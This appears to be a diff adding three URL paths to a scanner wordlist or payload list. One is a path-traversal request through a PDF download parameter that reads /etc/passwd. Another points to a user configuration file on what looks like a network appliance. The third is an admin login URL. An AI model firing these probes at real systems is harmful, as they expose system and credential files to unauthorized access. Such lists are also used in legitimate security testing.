@@ -1,0 +1,3 @@
+/report/download.php?pdf=../../../../../etc/passwd
+/tmp/updateme/sinfor/ad/sys/sys_user.conf
+/ui/login.php?user=admin
